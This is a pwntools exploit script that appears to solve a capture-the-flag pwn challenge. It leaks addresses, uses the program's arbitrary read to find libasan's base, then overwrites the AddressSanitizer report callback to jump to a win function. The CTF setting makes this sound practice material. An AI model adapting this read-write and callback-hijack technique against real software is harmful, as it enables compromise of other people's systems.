from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./nasa"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "grandridge-of-explosive-markets.gpn23.ctf.kitctf.de", "443", ssl=True)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


stack_addr = int(io.recvline().strip(), 16)
win_addr = int(io.recvline().strip(), 16)
log.success("stack:-----> " + hex(stack_addr))
log.success("win:-----> " + hex(win_addr))

win_offset = 0x1309
got_asan_init_offset = 0x3f60
asan_init_offset = 0x00000000010aef0
report_callback_offset = 0x000000000103c30
report_callback_offset = 0x1ae630


binary_base = win_addr - win_offset
got_asan_init = binary_base + got_asan_init_offset
log.success("binbase:-----> " + hex(binary_base))
log.success("got_asan:-----> " + hex(got_asan_init))

io.sendlineafter("Exit", "2")
io.sendlineafter("8-byte adress to read please (hex)\n",
                 hex(got_asan_init)[2:])
asan_init_addr = int(io.recvline().strip(), 16)
log.success("asan_init_addr:-----> " + hex(asan_init_addr))

libasan_base = asan_init_addr - asan_init_offset
callback_ptr_addr = libasan_base + report_callback_offset
log.success("libasan_base:-----> " + hex(libasan_base))
log.success("callback_ptr_addr:-----> " + hex(callback_ptr_addr))

io.sendlineafter("Exit", "1")
io.sendlineafter("8-byte adress and 8-byte data to write please (hex)\n",
                 f"{hex(callback_ptr_addr)[2:]} {hex(win_addr)[2:]}")

io.sendlineafter("Exit", "1")
io.sendline(b"0 0")

io.interactive()
